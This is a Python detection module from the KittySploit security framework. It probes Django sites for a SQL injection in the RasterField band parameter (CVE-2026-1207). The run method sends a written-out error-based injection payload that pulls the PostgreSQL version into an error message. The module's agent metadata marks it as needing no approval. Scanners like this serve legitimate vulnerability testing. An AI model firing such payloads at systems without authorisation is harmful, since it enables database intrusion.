#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Django < 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Django RasterField - SQL Injection Detection',
        'description': 'Django < 6.0.2, < 5.2.11, and < 4.2.28 contains a SQL injection caused by improper sanitization of the band index parameter in RasterField on PostGIS, letting remote attackers inject SQL, exploit requires crafted input.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'django', 'sqli', 'postgis', 'rasterfield', 'vuln', 'unauth', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2026-1207',
            'https://www.djangoproject.com/weblog/2026/feb/03/security-releases/',
            'https://github.com/django/django/commit/81aa5292967cd09319c45fe2c1a525ce7b6684d8',
        ],
        'cve': 'CVE-2026-1207',
    }

    def run(self):
        for path in ('/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--', '/api/raster/search/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('invalid input syntax for type integer', 'PostgreSQL',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Django RasterField - SQL Injection detected",
                    path=path,
                )
                return True
        return False

